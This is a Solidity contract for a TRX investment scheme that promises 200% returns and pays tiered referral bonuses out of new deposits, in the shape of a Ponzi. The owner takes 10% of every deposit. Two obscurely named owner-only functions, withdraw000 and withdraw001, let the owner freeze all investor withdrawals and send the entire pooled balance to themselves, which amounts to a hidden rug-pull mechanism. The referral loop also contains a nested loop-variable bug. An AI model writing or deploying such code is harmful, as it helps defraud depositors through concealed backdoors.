pragma solidity ^0.5.14;

import "./SafeMath.sol";

contract InvetingWozx {
  using SafeMath for uint;
  
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    address sponsor;
    bool exist;
    Referer[] referers;
    string ethereum;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint public MIN_DEPOSIT = 3000 trx;

  address payable public owner;
  address public NoValido;
  bool public Do;
  
  Tariff[] public tariffs;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  uint public InContract;

  mapping (address => Investor) public investors;

  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount_withdraw);
  event reInvest(address user, uint amount_reInvest);
  event referersRegistered(address to_user, uint nivelProfundidad);
  
  constructor() public {
    owner = msg.sender;
    start();
    Do = true;
       
    tariffs.push(Tariff(100 * 28800, 200));
    //tariffs.push(Tariff(1 * 28800, 100));

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function Do2() public view returns (bool){
    return Do;
  }

  function InContract2() public view returns (uint){
    return InContract;
  }

  function owner2() public view returns (address){
    return owner;
  }

  function setOwner(address payable _owner) public returns (address){
    require (msg.sender == owner);
    require (_owner != owner);

    owner = _owner;
    investors[owner].registered = true;
    investors[owner].sponsor = owner;
    investors[owner].exist = false;
    totalInvestors++;

    return owner;
  }
  
  
  function start() internal {
    require (msg.sender == owner);
      investors[msg.sender].registered = true;
      investors[msg.sender].sponsor = owner;
      investors[msg.sender].exist = false;
      totalInvestors++;

  }
  
  function register() internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
    }
  }

  function registerSponsor(address sponsor) internal {
    if (!investors[msg.sender].exist){
      investors[msg.sender].sponsor = sponsor;
      investors[msg.sender].exist = true;
    }
  }

  function registerReferers(address ref, address spo) internal {
      
    uint nvl = 0;

      
    if (investors[spo].registered) {

      investors[spo].referers.push(Referer(ref,3));
      nvl++;
      emit referersRegistered(spo, nvl);
      if (investors[spo].exist){
        spo = investors[spo].sponsor;
        if (investors[spo].registered){
          investors[spo].referers.push(Referer(ref,2));
          nvl++;
          emit referersRegistered(spo, nvl);
          if (investors[spo].exist){
            spo = investors[spo].sponsor;
            if (investors[spo].registered){
              investors[spo].referers.push(Referer(ref,1));
              nvl++;
              emit referersRegistered(spo, nvl);
              if (investors[spo].exist){
                spo = investors[spo].sponsor;
                if (investors[spo].registered){
                   investors[spo].referers.push(Referer(ref,1));
                   nvl++;
                   emit referersRegistered(spo, nvl);
                }
              }
            }
          }
        }
      }
    }
  }
  
  function rewardReferers(address yo, uint amount, address sponsor) internal {
    address spo = sponsor;
    for (uint i = 0; i < 4; i++) {

      if (investors[spo].exist) {

        for (i = 0; i < investors[spo].referers.length; i++) {
          if (!investors[spo].registered) {
            break;
          }
          if ( investors[spo].referers[i].myReferer == yo){
              uint b = investors[spo].referers[i].nivel;
              uint a = amount * b / 100;
              investors[spo].balanceRef += a;
              investors[spo].totalRef += a;
              totalRefRewards += a;
          }
        }

        spo = investors[spo].sponsor;
      }
    }
    
    
  }
  
  function deposit(uint tariff, address _sponsor) external payable returns (uint ,bool) {
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require (_sponsor != msg.sender);
    
    register();

    if (_sponsor != owner && investors[_sponsor].registered && _sponsor != NoValido){
      if (!investors[msg.sender].exist){
        registerSponsor(_sponsor);
        registerReferers(msg.sender, investors[msg.sender].sponsor);
      }
    }

    if (investors[msg.sender].exist){
      rewardReferers(msg.sender, msg.value, investors[msg.sender].sponsor);
    }
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    owner.transfer(msg.value.mul(10).div(100));
    InContract += msg.value.mul(90).div(100);
    
    emit DepositAt(msg.sender, tariff, msg.value);

    return (msg.value, true);
  }
  
  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
    
  function withdraw000() public returns (bool set_Do) {
    require (msg.sender == owner);
      if(Do){
        Do = false;
      }else{
        Do = true;
      }

    return Do;
  }

  function withdraw001() public returns (uint) {
    require(msg.sender == owner);
    require (InContract > 0);
    if (msg.sender.send(InContract)){
      uint IC = InContract;
      InContract = 0;
      return IC;
    }
  }

  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  function miETH (address  _direccion) public view returns(string memory eth)  {
    Investor storage inv = investors[_direccion];
    eth = inv.ethereum;

    return eth;
  }
  
  function setETH (string memory _direccion) public returns (bool, string memory){
    Investor storage inv = investors[msg.sender];
    inv.ethereum = _direccion;

    return (true, _direccion);
  }
  
  function nuevoMinDeposit(uint num)public{
    require (msg.sender == owner);
    MIN_DEPOSIT = num*1 trx;
  }
 
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }
  
  function withdraw() external {
    if (Do){
      uint amount = profit();
      uint tariff = 0;
      uint amount25 = amount.mul(25).div(100);
      uint amount75 = amount.mul(75).div(100);
      if (msg.sender.send(amount75)) {
        investors[msg.sender].withdrawn += amount75;
        investors[msg.sender].invested += amount25;
        
        investors[msg.sender].deposits.push(Deposit(tariff, amount25, block.number));
        
        totalInvested += amount25;

        InContract -= amount75;
      
        emit Withdraw(msg.sender, amount75);
        emit reInvest(msg.sender, amount25);
      }

    }
    
  }

  function () external payable {}  
  
}